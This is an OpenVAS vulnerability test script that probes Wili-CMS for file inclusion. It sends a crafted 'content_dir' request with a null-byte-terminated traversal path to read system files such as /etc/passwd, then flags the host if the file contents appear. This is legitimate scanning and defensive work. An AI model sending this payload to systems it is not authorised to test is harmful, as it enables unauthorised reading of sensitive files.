###############################################################################
# OpenVAS Vulnerability Test
# $Id: wili_cms_remote_file_include.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Wili-CMS remote and local File Inclusion and Authentication
# Bypass
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100021");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Wili-CMS remote and local File Inclusion and Authentication Bypass");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/8166/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Update to a newer version if available.");

  script_tag(name:"summary", value:"Wili-CMS is prone to a remote and local file-include vulnerability
  because it fails to sufficiently sanitize user-supplied data.

  Wili-CMS is also prone to a Authentication Bypass which allows a
  guest to login as admin.");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to compromise the
  application and the underlying system. Other attacks are also possible.");

  script_xref(name:"URL", value:"http://wili-cms.sourceforge.net/");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    url = string(dir, "/?npage=-1&content_dir=/" + file + "%00");
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
    if( buf == NULL ) continue;

    if ( egrep( pattern:pattern, string:buf ) ||
         egrep( pattern:"Warning.*:+.*include\(/" + file + "\).*failed to open stream", string:buf ) ) { # /etc/passwd not found or not allowed to access. Windows or SAFE MODE Restriction.
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );